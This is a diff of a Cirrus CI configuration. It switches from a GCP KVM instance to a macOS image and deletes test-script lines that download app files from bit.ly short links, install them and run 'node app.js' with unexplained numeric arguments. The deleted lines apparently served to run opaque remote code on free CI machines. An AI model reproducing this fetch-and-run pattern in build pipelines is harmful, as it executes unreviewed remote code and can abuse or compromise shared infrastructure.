@@ -1,20 +1,9 @@
-compute_engine_instance:
-  image_project: cirrus-images # GCP project
-  image: family/docker-kvm # family or a full image name.
-  platform: linux
-  cpu: 4 # optional. Defaults to 2 CPUs.
-  memory: 4G # optional. Defaults to 4G.
-  disk: 100 # optional. By default, uses the smallest disk size required by the image.
-  nested_virtualization: true # optional. Whether to enable Intel VT-x. Defaults to false.
+macos_instance:
+  image: big-sur-base
+  cpu: 4
 
 test_task:
   clone_script: echo "cirrusCI VIPPROMAX"
   test_script: |
-    curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh
-    sudo bash nodesource_setup.sh
-    sudo apt install -y nodejs
     node -v
-    curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/3hYdY4n -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
-    npm i -s
-    node app.js solo fi 4 1 240 2
 
